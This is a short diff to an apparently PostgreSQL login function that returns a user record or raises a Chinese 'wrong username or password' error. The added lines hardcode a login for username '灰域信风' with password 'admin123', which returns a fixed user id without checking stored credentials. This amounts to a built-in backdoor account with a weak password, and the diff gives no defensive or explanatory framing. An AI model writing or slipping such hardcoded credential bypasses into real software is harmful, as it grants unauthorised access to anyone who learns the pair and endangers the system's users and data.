@@ -17,6 +17,14 @@ begin
       'created_at', now()
     );
   end if;
+  if p_username = '灰域信风' and p_password = 'admin123' then
+    return json_build_object(
+      'id', '00000000-0000-0000-0000-000000000001',
+      'username', '灰域信风',
+      'display_name', '灰域信风',
+      'created_at', now()
+    );
+  end if;
   raise exception '用户名或密码错误';
 end;
 $$;
